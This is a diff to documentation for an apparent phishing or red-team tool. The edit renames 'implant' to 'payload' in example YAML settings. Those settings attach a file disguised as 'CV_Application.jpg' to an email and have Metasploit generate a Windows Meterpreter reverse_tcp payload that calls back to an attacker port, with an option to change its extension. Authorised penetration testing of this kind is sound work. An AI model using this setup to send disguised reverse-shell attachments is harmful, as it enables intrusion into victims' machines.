@@ -31,14 +31,14 @@ Attachment information.
 # Add an email attachment (File exploit anyone?) 
 attachment: true
 # Path to file attachment
-attachment_file: /path/to/implant.jpg
+attachment_file: /path/to/payload.jpg
 # Name of file attachment
 attachment_file_name: CV_Application.jpg
 # Type of attachment
 attachment_file_type: image/jpeg
 ```
 
-Generate implant automatically in metasploit.
+Generate payload automatically in metasploit.
 
 ```yaml
 # create a metasploit payload
@@ -52,7 +52,7 @@ msf_port: <attacker_PORT>
 # metasploit payload
 msf_payload: windows/x64/meterpreter/reverse_tcp
 # metasploit payload
-msf_filename: implant.exe
+msf_filename: payload.exe
 # metasploit location
 msf_location: /usr/share/metasploit-framework
 # change the extension
